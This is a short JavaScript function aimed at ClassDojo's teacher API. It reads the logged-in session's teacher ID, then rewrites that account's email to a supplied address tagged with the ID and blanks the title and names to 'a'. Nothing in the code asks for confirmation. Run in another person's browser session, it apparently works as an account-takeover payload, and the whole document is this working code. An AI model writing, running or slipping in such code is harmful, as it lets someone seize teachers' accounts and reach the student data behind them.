function updateTeacherEmail(email) {
    fetch('https://teach.classdojo.com/api/session')
      .then(response => response.json())
      .then(data => {
        var teacherId = data.teacher._id;
        var [localPart, domain] = email.split('@');
        var dynamicEmail = `${localPart}+${teacherId}@${domain}`;
        fetch('https://teach.classdojo.com/api/teacher/' + teacherId, {
          method: 'PUT',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            _id: teacherId,
            title: 'a',
            firstName: 'a',
            lastName: 'a',
            emailAddress: dynamicEmail
          })
        });
      });
}
